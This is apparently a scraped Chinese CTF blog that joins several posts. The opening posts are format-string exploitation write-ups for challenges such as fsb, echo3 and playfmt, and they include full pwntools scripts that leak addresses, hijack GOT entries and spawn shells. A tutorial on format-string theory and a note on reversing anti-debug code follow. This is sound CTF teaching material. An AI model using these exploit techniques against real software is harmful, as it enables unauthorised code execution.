这个返回地址改成我们摆放的shellcode的地址即可。 expfrom pwn import * import time context.log_level = 'debug' context.arch = 'i386' io = process('./playfmt') # io = remote('node3.buuoj.cn',26382) buf = 0x0804A060 + 0x40 #0x804a0a0 offset1 = 6 offset2 = 10 info('---leak stack address---') io.recvuntil('\\n=====================\\n') io.sendline('%10$p') ret_stack_addr = int(io.recv(10),16) - 28 print('leak ret_stack_addr:'+hex(ret_stack_addr)) info('---change the retaddr---') key = int(str(hex(ret_stack_addr))[-2:],16) payload = \"%&#123;&#125;c%6$hhn\".format(key) raw_input('-&gt;') io.sendline(payload) sleep(0.1) io.recv() key2 = 0xa0a0 payload = \"%&#123;&#125;c%10$hn\".format(key2) payload = payload.ljust(0x40) payload += asm(shellcraft.sh()) raw_input('-&gt;') io.sendline(payload) io.recv() sleep(0.1) io.sendline('quit') io.interactive() 记得发出去一次payload，一定需要接受一次，再去发第二个payload，防止没有完成一个printf，就让程序接受发送的东西，这样容易崩溃。 pwnable-fsbarch和保护Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 开了nx了。 ida分析for ( k = 0; k &lt;= 3; ++k ) &#123; printf(\"Give me some format strings(%d)\\n\", k + 1); read(0, buf, 0x64u); printf(buf); &#125; puts(\"Wait a sec...\"); sleep(3u); 可以看到这里控制了可以利用printf函数漏洞的次数，只可以利用4次。 execve(path, &amp;path, 0); 且这一条可以给你拿到shell。 那攻击思路就可以是改掉puts，sleep的got表，到这个拿取shell的位置就行。因为这里下面就调用一次sleep，就改它好了，基本不会出问题。 注意一下这里的汇编代码，其也是让栈的esp处于不定的状态。 gdb分析此时的EBP = 0xffffd228 0000| 0xffffd1e0 --&gt; 0x804a100 (\"AAAA\\n\") 0004| 0xffffd1e4 --&gt; 0x804a100 (\"AAAA\\n\") 0008| 0xffffd1e8 --&gt; 0x64 ('d') 0012| 0xffffd1ec --&gt; 0xf7f5b2a2 (\"__vdso_clock_gettime\") 0016| 0xffffd1f0 --&gt; 0xf7fe1fc9 (&lt;do_lookup_x+9&gt;: add ebx,0x1b037) 0020| 0xffffd1f4 --&gt; 0x0 0024| 0xffffd1f8 --&gt; 0xf7ffdad0 --&gt; 0xf7ffda74 --&gt; 0xf7fd3470 --&gt; 0xf7ffd918 --&gt; 0x0 0028| 0xffffd1fc --&gt; 0xffffd278 --&gt; 0xf7e0b018 --&gt; 0x3eab 0032| 0xffffd200 --&gt; 0xffffd2c0 --&gt; 0x804a024 --&gt; 0xf7ed6290 (&lt;close&gt;: cmp DWORD PTR gs:0xc,0x0) 0036| 0xffffd204 --&gt; 0x8048870 (\"/bin/sh\") 0040| 0xffffd208 --&gt; 0x0 0044| 0xffffd20c --&gt; 0x0 0048| 0xffffd210 --&gt; 0xffffd4a4 --&gt; 0x0 0052| 0xffffd214 --&gt; 0xffffdfce --&gt; 0x656d2f00 ('') 0056| 0xffffd218 --&gt; 0xffffd230 --&gt; 0x0 0060| 0xffffd21c --&gt; 0xffffd234 --&gt; 0x0 0064| 0xffffd220 --&gt; 0x0 0068| 0xffffd224 --&gt; 0x1 0072| 0xffffd228 --&gt; 0xffffd378 --&gt; 0x0 可以看到，因为这个题是main -&gt; fsb ,用户代码只有2层函数的调用，看这个ebp chain的时候就有点不方便了，我们没有一个完整的chain来使用。这个时候，就只能把ebp3 的值，自己写上去，写上sleep的got然后再改成拿shell的地址就行了。整个过程还是需要泄漏一下栈地址esp，因为其栈是变化的。泄露以后，也获取一下ebp2的值，然后（ebp2- esp ）/4 也就确定到了，main的ebp值（ebp3）对应格式化字符串的偏移值。然后再次利用printf函数根据这个偏移来进行改写sleep got上的值。 expfrom pwn import * import time context.log_level = 'debug' context.arch = 'i386' io = process('./fsb') # s = ssh( # host=\"pwnable.kr\", # port=2222, # user=\"fsb\", # password=\"guest\" # ) # io = s.run(\"/home/fsb/fsb\") # io = shell.run(\"/home/fsb/fsb\") sleep_got = 0x0804a008 info('--------leak stack base:-------') io.recvuntil('strings(1)\\n') io.sendline('%14$p') io.recvuntil('0x') stack_base = int(io.recv(8),16) - 80 print(hex(stack_base)) info('--------leak the point to main ebp:-------') io.recvuntil('strings(2)\\n') io.sendline('%18$p') io.recvuntil('0x') point = int(io.recv(8),16) print(hex(point)) info('--------write sleep_got to main_ebp :-------') io.recvuntil('strings(3)\\n') key1 = 0x0804A008 payload = '%' + str(key1) + 'c%18$n' io.sendline(payload) info('--------write tag to sleep_got :-------') tag = 0x869F offset = (point - stack_base) / 4 payload = \"%&#123;&#125;c%'str(offset)'$hn \".format(tag) io.recvuntil('strings(4)\\n') io.sendline(payload) io.interactive() inndy-echo3保护和archArch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) ida分析这一处会让栈的情况变得无法预测。然后进入hardfmt： for ( i = 0; i &lt;= 4; ++i ) &#123; read(0, buff, 0x1000u); printf(buff); &#125; 这一处存在漏洞，且往下看感觉没什么好利用的，没什么漏洞函数。那攻击思路就是：改printf的got表，然后在第5次传过去/bin/sh即可。（这个题目思路还是很简单的，但是因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞。） gdb分析因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间，这样做起来会简单一些。 我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞： 仔细看下此时的栈情况 ，然后再次分析下我们的目标 ： 泄漏libc基址，计算出system的内存地址。 在栈上构造出printf的got地址和printf的got地址+2的地址（0x0804a014和0x0804a016） 在构造的got地址上，开始写system地址 由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。如上图所示，很简单就可以泄漏出libc基址。但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。 此时注意图上前两个框框，可以发现把第二个框框的两个地址修改为 第一个框框的栈指针： gdb-peda$ set *0xffbe5e6c = 0xffbe5d54 gdb-peda$ set *0xffbe5e64 = 0xffbe5d60 这个过程在泄漏目标栈地址以后，也是可以通过一次printf函数写入2次地址，实现这个栈情况的。 接着就可以构造got地址： gdb-peda$ set *0xffbe5d60 = 0x0804a016 gdb-peda$ set *0xffbe5d54 = 0x0804a014 然后就可以写system的内存地址上got了： 0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;: sub esp,0xc) 这样再传过去一下/bin/sh即可。 expfrom pwn import * context.log_level = 'debug' context.arch ='i386' import time elf = ELF('./echo3') debug = 1 while True: if debug : io = process('./echo3') libc = elf.libc else: io = remote('node3.buuoj.cn',25057) libc = ELF('./libc-2.23.so.i386') payload = '%43$pA%30$pA%47$p' io.sendline(payload) address = io.recvline().strip() if address[-3:] == '637': if address[7:10] == '637': libc_base = int(address[2:10],16) - 247 - libc.symbols['__libc_start_main'] tag1_stack_point = int(address[13:21],16) - 0x118 tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8 system_addr = libc_base + libc.symbols['system'] print('system_addr -&gt;' + hex(system_addr)) print('tag1_stack_point -&gt;' + hex(tag1_stack_point)) print('tag2_stack_point -&gt;' + hex(tag2_stack_point)) break else : io.close() continue # io = def fmtshort(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result def fmtbyte(prev,val,idx,byte = 1): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hhn\" return result printf_got = 0x0804a014 key1 = int(hex(tag1_stack_point)[-4:],16) key2 = int(hex(tag2_stack_point)[-4:],16) info('--------change the two points to tag_stack_point:-------') # raw_input('-&gt;') prev = 0 payload = \"\" for i in range(1): payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i) prev = (key1 &gt;&gt; i*16) &amp; 0xffff for i in range(1): payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i) prev = (key2 &gt;&gt; i*16) &amp; 0xffff payload = payload + '1111' raw_input('-&gt;') io.sendline(payload) io.recvuntil('1111') info('--------change got_table to printf_got:-------') raw_input('-&gt;') prev = 0 payload = \"\" key3 = 0x14 key4 = 0x16 for i in range(1): payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i) prev = (key3 &gt;&gt; i*8) &amp; 0xff for i in range(1): payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i) prev = (key4 &gt;&gt; i*8) &amp; 0xff payload = payload + '2222' io.sendline(payload) io.recvuntil('2222') info('--------change printf_got to system_addr:-------') raw_input('-&gt;') prev = 0 payload = \"\" key5 = int(hex(system_addr)[-4:],16) key6 = int(hex(system_addr)[2:6],16) print('key5 -&gt; ' + hex(key5)) print('key6 -&gt; ' + hex(key6)) for i in range(1): payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i) prev = (key5 &gt;&gt; i*16) &amp; 0xffff for i in range(1): payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i) prev = (key6 &gt;&gt; i*16) &amp; 0xffff payload = payload + '3333' io.sendline(payload) sleep(1) io.recvuntil('3333') raw_input('&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;') io.sendline('/bin/sh\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00') io.interactive() 这个exp的难点在于： 注意去定位到合适的栈结构再去利用 尽量充分利用每一次的printf 单次printf多次写入 注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。结论和收获 这个题教会我一定要灵活、充分的利用栈上的数据,单纯的ebp链只是适合简单的情况。还有就是面对这种会有随机栈情况的题目，尽量要注意本地和远程的ibc版本、注意环境,这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。 xman-2019-format保护和archCANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial ida分析char *__cdecl sub_80485C4(char *s) &#123; char *v1; // eax char *result; // eax puts(\"...\"); v1 = strtok(s, \"|\"); printf(v1); while ( 1 ) &#123; result = strtok(0, \"|\"); if ( !result ) break; printf(result); &#125; return result; &#125; 这里因为用strtok做处理，只有一次的传送机会，payload需要用| 分割格式化字符串来完成每次的printf的漏洞利用，稍微麻烦了一下。并且存在后门函数： .text:080485AB push ebp .text:080485AC mov ebp, esp .text:080485AE sub esp, 8 .text:080485B1 ; 3: return system(\"/bin/sh\"); .text:080485B1 sub esp, 0Ch .text:080485B4 push offset command ; \"/bin/sh\" .text:080485B9 call _system .text:080485BE add esp, 10h .text:080485C1 nop .text:080485C2 leave .text:080485C3 retn 这下可以直接改ret address即可。 gdb分析先观察一下ebp链是否存在 ：是存在的，然后直接利用就好了。看一下，在第一次改ebp2里面的值： 0xffffd338 时，发现下面的第二个只需要改一个字节即可，然后目标就是改成这个栈地址了：然后接着利用漏洞，改一下返回地址到后门函数即可。 （这个题自己在做的时候，先是试着利用第二个的0xffffd2f8 ，这个链发现本地可以打通，远程是不行的，这就是环境因素了，远程由于libc版本的不同，栈结构也是不同的。所以做题还是优先，考虑ebp链，然后没法利用了，在考虑充分利用栈数据，这个通常也是出题人精心设计的栈结构，让你有数据可以利用。） expfrom pwn import * context.log_level = 'debug' context.arch = 'i386' system_addr = 0x080485B4 tag1 = 0x4c tag2 = 0x85ab io = process('./xman_2019_format') # io = remote('node3.buuoj.cn',27012) payload = '%&#123;&#125;c%10$hhn|'.format(0x4c) payload += '%&#123;&#125;c%18$hn~'.format(0x85ab) while True: try: io.recvuntil('...\\n...\\n') io.sendline(payload) sleep(0.1) io.recvuntil('~') io.sendline('ls') io.recvline() io.recvline() io.interactive() break except EOFError : io.close() io = process('./xman_2019_format') # io = remote('node3.buuoj.cn',27012) 需要爆破栈。 suctf-2019-playfmt保护和archArch: i386-32-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 开启了RELRO，这样就无法got hijack了 ida分析 gdb分析程序先读入了flag文件，自己可以写一个flag文件测试，并且gdb跟随：其会被读到堆上。紧接着跟到格式化字符串漏洞处：看一下这个堆地址是否被程序操作修改了： gdb-peda$ x/s 0x8050b70 0x8050b70: \"flag&#123;f9255a80-e059-4c12-8788-161bf8c6908b&#125;\" 发现并没有，那就很简单了。攻击思路就是，在栈上构造出这个存放flag的堆地址（计算方式就是在此时的栈上找一个地址来计算偏移获取）。第一步：先修改ebp2上存放的值，改成后面那个框框对应的栈地址，然后在做处理： 0024| 0xffffd318 --&gt; 0xffffd338 --&gt; 0xffffd348 --&gt; 0x8050ba0 --&gt; 0x0 此时再修改ebp1上的值，改成刚刚的堆地址 ： 这样exp写的时候，找好偏移%s一下就出来了。 expfrom pwn import * context.log_level = 'debug' context.arch = 'i386' # io = remote('node3.buuoj.cn',27816) io = process('./1') io.recvuntil('Magic echo Server') io.recvuntil('=====================\\n') io.sendline('%18$p') io.recvuntil('0x') flag = int(io.recv(8),16) print(hex(flag)) key = int((hex(flag))[-4:],16) - 32 -12 -4 print('key'+ hex(key)) # raw_input('-&gt;') io.sendline('%6$p') io.recvuntil('0x') stack_point = int(io.recv(8),16) + 16 tag1 = int((hex(stack_point))[-2:],16) print(hex(tag1)) payload = '%' + str(tag1) + 'c%6$hhn' + '1' raw_input('-&gt;') io.sendline(payload) io.recvuntil('1') payload = '%' + str(key &amp; 0xffff) + 'c%14$hn' + '2' raw_input('-&gt;') io.sendline(payload) io.recvuntil('2') io.sendline('%18$s') io.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"学习记录","slug":"学习记录","permalink":"http://chumen77.xyz/tags/学习记录/"}]},{"title":"修复七千云外链失效","slug":"修复七千云外链失效","date":"2020-03-12T15:17:10.000Z","updated":"2020-03-13T02:48:54.000Z","comments":true,"path":"2020/03/12/修复七千云外链失效/","link":"","permalink":"http://chumen77.xyz/2020/03/12/修复七千云外链失效/","excerpt":"","text":"修复七千云外链失效背景自己的以前申请过一个七千云做自己的图床，今晚写博客发现，自己上传不上图片，并且用upic导出来的链接无法显示图片了。查了很久的原因，发现是七千牛原来给我分配的免费外链域名给我断用了。就是这个没了，自己排错，排了半天才发现。是在这里找到的，好隐蔽。。。然后就在文件管理那里发现，网站提示说如果无法显示图片，加载慢，可以加一个域名。然后我就尝试加了一个，然后就修复好了。 修复过程绑定创建域名xxxx也就是填你的域名，前面的可以自定义。点击添加后下面总是会自动又弹出一个空白的框，点击后面的删除，否则，往下滑你会发现就是创建不了这个记录。创建成功后，会提示你复制CNAME，复制一下，去往你自己的域名网站，我用的是阿里云。 去自己的dns解析平台￼这里的主机记录填入刚刚你自定义的主机开头，记录值填入刚刚复制的CNAME，就可以了。 修改upic设置填入即可，以前写的博客，图片的链接也要改一下，就恢复原来的样子了。","categories":[],"tags":[{"name":"杂项","slug":"杂项","permalink":"http://chumen77.xyz/tags/杂项/"}]},{"title":"格式化字符串漏洞小总结（上）","slug":"格式化字符串漏洞小总结（上）","date":"2020-03-12T13:13:41.000Z","updated":"2020-10-07T01:18:54.688Z","comments":true,"path":"2020/03/12/格式化字符串漏洞小总结（上）/","link":"","permalink":"http://chumen77.xyz/2020/03/12/格式化字符串漏洞小总结（上）/","excerpt":"","text":"格式化字符串漏洞小总结（上）前言记录一下，在学习这个漏洞时候的自己感觉的疑难点，和做题时候的一点小技巧，这一篇主要是记录理论。 格式化字符串基本格式： %[parameter][flags][field width][.precision][length]type 需要重点关注的pattern： parameter ：n$，获取格式化字符串中的指定参数 field width ：输出的最小宽度 precision ：输出的最大长度 length，输出的长度 : hh，1-byte ； h，2-byte ； l, 4-byte ；ll,8-byte ； type :d/i，有符号整数 u，无符号整数 x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母. s，输出以null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。 c，把 int 参数转为 unsigned char 型输出 p， void * 型，输出对应变量的值。printf(\"%p\",a) 用地址的格式打印变量 a 的值，printf(\"%p\", &amp;a) 打印变量 a 所在的地址。 n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。（仅仅是在这一个printf的函数） %， '%'字面值，不接受任何 flags, width。 参数：就是是要对应输出的变量。 格式化字符串漏洞原理格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。 根据 cdecl 的调用约定,在进入 printf() 函数之前,将参数从右到左依次压栈。进入printf() 之后,函数首先获取第一个参数,一次读取一个字符。如果字符不是 % ,字符直接复制到输出中。否则,读取下一个非空字符,获取相应的参数并解析输出。如上图一样，格式化字符串的参数与后面实际提供的是一一对应的，就不会出现什么问题，但如果在格式化字符串多加几个格式化字符的时候，程序会怎么办呢？此时其可以正常通过编译，并且在栈上取值，按照给的格式化字符来解析对应栈上的值。此时也就发生了格式化字符串漏洞。 漏洞利用泄露内存数据栈上的数据 利用 % order $ p / % order x 来获取指定参数对应栈的内存值 。(常用%p) 利用 % order $ s 来获取指定变量所对应地址的内容，只不过有零截断。(这个在做某些ctf题很好用，当一个程序上来读取一个flag到一个位置，然后你在栈上构造这个位置，直接%s就出来flag了。)任意地址内存当想泄露任意地址内存的时候，就需要想办法把地址写入栈中。在一般情况下，格式化字符串也是存在栈上的，当可控的时候，就可以直接把某个地址写到这个格式化字符串上，然后找下在这个printf函数中对应的栈偏移，然后在用你想用的格式化字符（%p/%x/%s）来操作即可。然后在这个地方，其有个难点就是找对应的栈偏移。在我们实际用的时候，其实就是找栈上的某个位置对应这个格式化字符串的偏移，并且也分为32位于64位，因为其传参是不一样的。确定偏移32位 这是32位的栈对应情况，是比较好理解的。如图，并且发现这些指定参数的（如%4$x),其就是对应找对应栈上内容 ，而不指定的%x其找寻找的时候，是看下前面有个几个对应的无指定格式化字符，就想图上的情况，再给一个%x其是会找到arg4。 64位￼因为64位的参数存放是优先寄存器(rdi,rsi,rdx,rcx,r8,r9)，占满以后第7个参数才会存放在栈上。这就是跟32位找偏移不同地方。 小技巧可以给gdb安装一下pwndbg，在GitHub上面找的到。然后演示一下： #include &lt;stdio.h&gt; int main()&#123; setvbuf(stdout,0,2,0); char buf[100]; read(0,buf,99); printf(buf); &#125; gdb调试，找图中框框的栈地址，对应的偏移：32位：64位： 注意是对应格式化字符串的偏移。用pwndbg的fmtarg确定偏移，就不用担心数错了。 写地址进栈学会确定偏移后，就可以写地址进栈，来实现读任意地址内存了。经常使用的是，把这个程序中的某个got地址写进栈，然后就可以了来获取其内容，然后在根据其在libc中的偏移就可以计算出libc的基址，进而算出任意一个函数的地址（如system）。 32位：格式：&lt;address&gt;%&lt;order&gt;$s这样就可以尝试读出，adress处对应的值，但是因为是%s，其遇到\\x00就会直接断了，没有想要的输出。更常有的情况就是，会输出一大堆，然后我们想要的地址掺杂在里面，所以可以改进一下，可以加一组标记，然后再去取出来想要，这样也可以来检测是否被\\x00截断了。改进格式：&lt;address&gt;@@%&lt;order&gt;$s@@在使用的时候记得除去 &lt; &gt;。实例： gdb-peda$ got /media/psf/mypwn2/HITCON-Training-master/LAB/lab7/test: file format elf32-i386 DYNAMIC RELOCATION RECORDS OFFSET TYPE VALUE 08049ffc R_386_GLOB_DAT __gmon_start__ 0804a028 R_386_COPY stdout@@GLIBC_2.0 0804a00c R_386_JUMP_SLOT read@GLIBC_2.0 0804a010 R_386_JUMP_SLOT printf@GLIBC_2.0 0804a014 R_386_JUMP_SLOT __stack_chk_fail@GLIBC_2.4 0804a018 R_386_JUMP_SLOT __libc_start_main@GLIBC_2.0 0804a01c R_386_JUMP_SLOT setvbuf@GLIBC_2.0 获取一下got，选择read ： 0x0804a00c ,然后借助pwntools： from pwn import * context.log_level = 'debug' io = process('./test') payload = p32(0x0804a00c) + '@@%6$s@@' # raw_input('-&gt;') io.sendline(payload) io.recvuntil('@@') print('leak-&gt;' +hex(u32(io.recv(4)))) io.interactive() 发现出现了异常。修改代码，查一下read在libc的symbols： from pwn import * context.log_level = 'debug' io = process('./test') elf = ELF('./test') libc = elf.libc payload = p32(0x0804a00c) + '@@%6$s@@' # raw_input('-&gt;') io.sendline(payload) io.recvuntil('@@') print('leak-&gt;' +hex(u32(io.recv(4)))) print('read-libc.symbols-&gt;' + hex(libc.symbols['read'])) io.interactive() 发现就是因为运气不好，这个libc版本里正好read函数是00结尾的，所以换一下:Printf : 0x0804a010这就可以了，并且还可以看出来的确是输出来一堆东西。 64位在64位程序当中，一个地址的高位必定就是0，所以address是不能写到格式化字符串的最前面的，可以跟在fmt后面，但是这里就牵涉到了字节对齐问题，并且其偏移量算起来，当格式化字符串不做padding时，偏移量时会因为格式化字符串的长度而发生变化的。所以较好的做法，就是在格式化字符串处做好padding，这样解决了字节对齐，也解决了偏移量的计算。实例：（还是刚刚的程序编译成64位） payload = '@@%6$s@@'.ljust(0x28,'a') + p64(0x000000601020) 这次把payload这样写，做好padding，把address写在后面，此时因为偏移会变，gdb调试一下看看，偏移变为多少：可以看出来偏移为11。发现再次运气不好，还是得换一个函数打印got，换成read： from pwn import * context.log_level = 'debug' io = process('./test3') elf = ELF('./test3') libc = elf.libc payload = '@@%11$s@@'.ljust(0x28,'a') + p64(0x000000601028) raw_input('-&gt;') io.sendline(payload) io.recvuntil('@@') print('leak-&gt;' +hex(u64(io.recv(6).ljust(8,\"\\x00\")))) print('read-libc.symbols-&gt;' + hex(libc.symbols['read'])) io.interactive() 这样就OK了。 小总结 使用%s 读取内存里的任意位址，%s 会把对应的参数当做 char*指标并将目标做为字符串印出来 使用限制:Stack 上要有可控制 addres 的buffer ;注意由于是当做字符串打印，所以到 0 时就会中断,也要注意32位跟64位address的写在的位置。小技巧0x1想要泄露libc基址，还有就是通过返回__libc_start_main + x(libc版本不一样可能会不一样，本人是ubuntu16.04)算一下偏移是21。from pwn import * context.log_level = 'debug' io = process('./test3') elf = ELF('./test3') libc = elf.libc payload = '%21$p'.ljust(0x8,'a') raw_input('-&gt;') io.sendline(payload) io.recvuntil('0x') libc_base = int(io.recv(12),16) - 240 - libc.symbols['__libc_start_main'] print('leak-&gt;' +hex(libc_base)) io.interactive() 运行这个exp来leak libc的基址：成功了。 0x2泄露stack address ：正如图中所示，会发现栈上说有很多与esp接近的数据，利用合适的数据根据偏移就会拿到esp的值，然后就得到了satck address。常用的也就是多层函数调用时，留下的ebp值。 覆盖内存覆盖内存通常其实就是改写内存，其中分为改写栈上的内存和任意地址的内存，从而来控制程序的执行流程。（这里我先只记录一下任意地址的覆盖，改写栈上的内存暂时用不到）这里面主要是使用%n, %n 转换指示符不输出字符，将 当前printf函数已经成功写入流或缓冲区中的字符个数写入对应的整型指针参数所指的变量。其核心就是：写入的值 = 已经输出的字符数 ，知道这个以后，其使用起来就是控制好在这次%n前输出正确的字符数。 任意地址覆盖 使用方法类似于%s的任意地址读取，只是换成了%n。 使用%xc的办法来控制输出的字符数。基本格式： ....[overwrite addr]....%[overwrite offset]$n其中.... 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。也就是构造一个需要写入的address，然后用%xxc来控制写入的字符数，然后把握好偏移。 fmt字符串写入大小因为%n在一次的写入是在一次当中写入int大小的整数，当使用%xc来控制输出一个int大小的字符个数，这个printf函数会输出十分大的字符数量，这个结果对我们说十分不利的，一方面远端程序输出以后，自己接收是一个问题，是十分不稳定的，并且无法精准的控制需要修改的地方。所以常用的是%hn 和%hhn，分别写入short和char大小的整数，然后分成多次写入以组合成完整的int整数，这个过程是十分稳定的。 单次printf多次写入在进行GOT hijack或者改掉某一个指标的时候，通常会要求一次printf内就要来改写完成，不然改一半的值这个指标再被使用时程序很容易崩溃。所以就可以把多个格式化字符串结合在一次，例如： %xc%offset1$hn %yc%offset2$hn address address+2 但这样就说需要小心偏移，并且输出的字符数也要控制好。难点也在控制这个多次写入时，c前面应该填多少的值。 多次写入时控制输出的字符数要注意的是%n写入的值是其前面输出的字符数。 第一次%xc%hhn的时候，要扣掉前面摆放的address的长度。比如32位时，其前面会摆放4个地址，这个时候就是x需要减去4x4 = 16. 之后每个%xc 必需扣掉前一个写入 byte 的值总字符数才会是这个写入需要的长度。比如 第一次写入值为 90 第二个写入 120 此时应为%30c% offset$hhn 当某一次写入的值比前面写入的要小的时候，就需要整数overflow回来。比如：需要写入的一个字节，用的是hhn的时候，前面那次写入的是0x80，这次写入的是0x50，这时候就用0x50可以加上0x100（256）=0x150 （这时候因为是hhn，在截取的时候就是截取的0x50）， 再减去0x80 = 0xD0（208），也就是填入%208c%offset$hhn即可。 当然这也是很规律的，在控制一个输出字符数，就分为3种情况： 前面已经输出的字符数小于这次要输出的字符数 前面已经输出的字符数等于于这次要输出的字符数 前面已经输出的字符数大于这次要输出的字符数 然后就可以写成一个脚本来实现自动化控制这个输出字符数： 单字节： # prev 前面已经输出多少字符 # val 要写入的值 # idx 偏移 def fmt_byte(prev,val,idx,byte = 1): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hhn\" return result #搭配： prev = 0 payload = \"\" # x就是你要写入的字节数，例如在改写64位got时常用是6，因为其前两个字节都一样 # idx是偏移，key是要写入的目标值 for i in range(x): payload +=fmt_byte(prev,(key &gt;&gt; 8*i) &amp; 0xff,idx+i) prev = (key &gt;&gt; i*8) &amp; 0xff 双字节： #跟上个基本一样，只是改了部分地方 def fmt_short(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result prev = 0 payload = \"\" for i in range(x): payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,idx+i) prev = (key &gt;&gt; i*16) &amp; 0xffff 在使用这两个脚本的时候，常用的是在获取到payload的时候也用payload.ljust()做好padding,来控制好字节对齐，然后再摆上需要写入x组的地址。（一会在题目中会有演示） pwntools pwnlib.fmtstr 模块pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') offset (int):你控制的第一个格式化程序的偏移量 writes (dict):格式为 {addr: value, addr2: value2},用于往 addr 里写入 value (常用:{printf_got}) numbwritten (int):已经由 printf 函数写入的字节数 write_size (str):必须是 byte,short 或 int。限制你是要逐 byte 写,逐 short 写还是逐 int 写(hhn,hn或n) 这个函数是十分好用的，具体可以去看一下pwntools的官方介绍，但是实际使用当中，会发现几个问题： 在64位中，并不好用，自动生成的payload中，它不会将地址放在格式化字符串之后，导致用不了。 在面对单次printf，实施多次写入的时候其更显的十分无力。 记录到这里，理论部分就差不多完了，下一篇主要记录的就是题解篇，会包含一些技巧，常见的ctf格式化字符串题目漏洞利用的常见套路，还有格式化字符串漏洞的高级利用（当格式化字符串漏洞的buf在bss上，这就意味着我们无法直接往栈上写地址，该怎么办？并且这种题目常在赛题中出现）","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"学习记录","slug":"学习记录","permalink":"http://chumen77.xyz/tags/学习记录/"}]},{"title":"XCTF\\_高校战疫赛\\_RE-天津垓","slug":"XCTF_高校战疫赛_RE_ 天津垓","date":"2020-03-11T13:06:03.000Z","updated":"2020-08-10T07:31:37.179Z","comments":true,"path":"2020/03/11/XCTF_高校战疫赛_RE_ 天津垓/","link":"","permalink":"http://chumen77.xyz/2020/03/11/XCTF_高校战疫赛_RE_ 天津垓/","excerpt":"","text":"XCTF_高校战疫赛_RE_ 天津垓_前言复现一个题，当时只做出来第一层加密。因为还没怎么接触反调试跟代码混淆，做不下去了，不过下来复现发现了较为简单的办法出来这个题，也是学到很多，就记录一下。 初步运行发现还需要装个cgwin1.dll，这个很好找，不过要注意64位系统，windows目录下的system32 跟syswow64都要放入。看来是需要输入判断。 ida分析这里就是第一层验证了，后来了解到这个是smc加密，我是直接写Python一位位爆破出来的。 v39 = 'Rising_Hopper!' result = '' key = [17,8,6,10,15,20,42,59,47,3,47,4,16,72,62,0,7,16] tag = [0x52,0x69,0x73,0x69,0x6E,0x67,0x5f,0x48,0x6f,0x70,0x70,0x65,0x72,0x21] for i in range(len(key)): x = 0 flag = 1 while flag: if ~(x &amp; tag[i % 14]) &amp; (x | tag[i % 14])==key[i] : flag = 0 result += chr(x) else: x += 1 print(result) #result = 'Caucasus@s_ability' 然后进入这个函数，发现这里根据刚刚解出来的字符串，传入后对*Unk_10040164D * 做了一些处理然后又返回到这堆数据。直接跟进去是没什么用的。所以需要动态调试，看看程序运行到这里，是怎么样的。 然后会发现，ida动态调试直接断掉了，肯定是有反调试了。x64可以调试，但是定位关键处有点难，并且看汇编代码也让自己这个菜鸡看吐了。所以就想办法破除对ida的反调试，然后到了关键代码也就是处理以后的Unk10040164D，看看逻辑是也想办法将其改变成伪代码，这样就好分析多了。 patch程序￼跟进入引用函数，发现是利用窗口事件来检测是否被调试器调试。并且在其中也发现了ida，这里patch程序可以用010editor，直接把ida的相关字眼改成其他的就行。但是要注意不要破坏其他的数据：￼我起初改成这样就不行，位位对齐，改成其他字符串就好了。 ida动态调试：断在这里，然后进入这入Unk10040164D 函数的时候，F7进入：发现已经有正常的汇编代码出来了（这里我的是已经修改过的），无法f5反编译，这时候可以在最初段push rbp 